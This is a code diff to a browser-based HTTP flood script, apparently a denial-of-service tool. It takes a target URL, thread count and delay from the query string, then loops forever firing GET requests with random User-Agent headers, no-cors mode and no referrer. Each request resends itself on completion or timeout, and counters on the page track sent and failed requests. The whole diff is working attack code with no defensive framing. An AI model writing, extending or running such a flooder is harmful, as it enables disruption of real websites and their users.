@@ -197,29 +197,56 @@ function getQueryVariable(variable)
 
 var url = getQueryVariable('url');
 var threads = getQueryVariable('threads');
-var uaHead = generateUA();
+var speed = getQueryVariable('speed');
 
-sendPacket(url);
+var sented = 0;
+var errors = 0;
 
-function sendPacket(url)
+start(url);
+
+async function start(url)
 {
-    var request = new XMLHttpRequest();
-    request.open('GET', url);
-    request.setRequestHeader("Access-Control-Allow-Origin", "*");
-    request.setRequestHeader("Access-Control-Allow-Methods", "GET, POST, PATCH, PUT, DELETE, OPTIONS");
-    request.setRequestHeader("Access-Control-Allow-Headers", "Origin, Content-Type, X-Auth-Token");
-
-    request.onreadystatechange = function()
+    await new Promise(r => setTimeout(r, 5000));
+    while (true)
     {
-        if (this.readyState == 4 && this.status == 200)
+        await new Promise(r => setTimeout(r, speed));
+        for(var i = 0; i < threads; i++)
         {
-            console.log("[INFO] SENDED Packet")
             sendPacket(url);
         }
-        else
-        {
-            console.log("[ERROR] Failed Packet")
-        }
     }
-    request.send();
+}
+
+async function sendPacket(url)
+{
+	const controller = new AbortController();
+	const id = setTimeout(() => { controller.abort(); document.getElementById('errors').innerText = ++errors; sendPacket(url)}, 5000);
+    try
+	{
+        let headers = new Headers({
+            "User-Agent"   : generateUA()
+        });
+        await fetch(url, { method: 'GET', mode: 'no-cors', signal: controller.signal,  referrerPolicy: 'no-referrer', headers: headers}).then((response) => {
+          if (!response || !response.ok && response.status != 0)
+          {
+            document.getElementById('errors').innerText = ++errors;
+          }
+          document.getElementById('sented').innerText = ++sented;
+
+          console.log(response.ok);
+          console.log(response.status);
+          clearTimeout(id);
+      })
+	}
+    catch(error)
+    {
+        if (error.code === 20)
+        {
+            return;
+        }
+        clearTimeout(id);
+        document.getElementById('errors').innerText = ++errors;
+    }
+    sendPacket(url);
+    return true;
 }
